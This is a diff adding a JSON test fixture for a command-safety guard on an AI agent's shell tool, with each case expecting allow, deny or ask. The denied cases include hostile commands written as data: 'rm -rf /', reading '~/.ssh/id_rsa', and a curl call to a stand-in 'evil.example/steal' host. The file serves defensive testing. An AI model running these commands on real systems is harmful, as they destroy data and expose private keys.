@@ -1,0 +1,122 @@
+[
+  {
+    "name": "safe_go_test",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspace_exec",
+      "command": "go test ./tool/safety"
+    },
+    "expect_decision": "allow"
+  },
+  {
+    "name": "dangerous_delete",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspace_exec",
+      "command": "rm -rf /"
+    },
+    "expect_decision": "deny",
+    "expect_rule": "TSG-CMD-001"
+  },
+  {
+    "name": "read_secret",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspace_exec",
+      "command": "cat ~/.ssh/id_rsa"
+    },
+    "expect_decision": "deny",
+    "expect_rule": "TSG-PATH-001"
+  },
+  {
+    "name": "network_denied",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspace_exec",
+      "command": "curl https://evil.example/steal"
+    },
+    "expect_decision": "deny",
+    "expect_rule": "TSG-NET-001"
+  },
+  {
+    "name": "network_allowed",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspace_exec",
+      "command": "curl https://github.com/trpc-group/trpc-agent-go"
+    },
+    "expect_decision": "allow"
+  },
+  {
+    "name": "shell_wrapper_bypass",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspace_exec",
+      "command": "sh -c \"echo hi\""
+    },
+    "expect_decision": "ask",
+    "expect_rule": "TSG-SHELL-001"
+  },
+  {
+    "name": "pipeline_command",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspace_exec",
+      "command": "cat go.mod | wc -l"
+    },
+    "expect_decision": "ask",
+    "expect_rule": "TSG-SHELL-003"
+  },
+  {
+    "name": "dependency_install",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspace_exec",
+      "command": "go install example.com/tool@latest"
+    },
+    "expect_decision": "ask",
+    "expect_rule": "TSG-DEP-001"
+  },
+  {
+    "name": "long_running",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspace_exec",
+      "command": "sleep 120"
+    },
+    "expect_decision": "ask",
+    "expect_rule": "TSG-RES-001"
+  },
+  {
+    "name": "large_output",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspace_exec",
+      "command": "yes"
+    },
+    "expect_decision": "ask",
+    "expect_rule": "TSG-RES-002"
+  },
+  {
+    "name": "hostexec_pty_session",
+    "request": {
+      "tool_name": "hostexec_exec_command",
+      "backend": "hostexec",
+      "command": "go test ./...",
+      "background": true,
+      "tty": true
+    },
+    "expect_decision": "ask",
+    "expect_rule": "TSG-HOST-001"
+  },
+  {
+    "name": "manual_review",
+    "request": {
+      "tool_name": "workspace_exec",
+      "backend": "workspace_exec",
+      "command": "echo $(whoami)"
+    },
+    "expect_decision": "ask",
+    "expect_rule": "TSG-PARSE-001"
+  }
+]
